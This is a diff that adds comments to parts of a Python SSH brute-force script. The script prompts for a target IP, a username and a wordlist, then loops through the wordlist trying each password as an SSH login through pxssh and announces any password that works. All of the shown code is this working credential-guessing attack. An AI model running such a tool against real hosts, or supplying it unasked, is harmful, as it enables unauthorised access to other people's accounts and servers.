@@ -70,9 +70,9 @@ def connect(host,user,line):
         ssh.login(host,user,line)
         print("PASSWORD FOUND!!! "+termcolor.colored(user+":"+line,'yellow'))
         sys.exit(0)
-    except pxssh.ExceptionPxssh as e:
+    except pxssh.ExceptionPxssh as e: #prints the exception into terminal
         print(e)
-    except KeyboardInterrupt as k:
+    except KeyboardInterrupt as k: #adds keyboard interrupt with response in terminal
         print("\n")
         print("terminate")
         print("raison:program stop by user",)
@@ -83,8 +83,8 @@ def brute():
     host=input("Enter IP Address:")
     user=input("Enter Username:")
     path=input("Enter Path To Wordlist/Dictionary:")
-    file=open(path, "r", encoding="ISO-8859-1")
-    for p in file.readlines():
+    file=open(path, "r", encoding="ISO-8859-1") #opens wordlist for use
+    for p in file.readlines(): #goes line by line through wordlist attempting SSH login to selected IP
         username=user.strip("\n")
         password=p.strip("\n")
         print(str(username) + ":" + str(password))
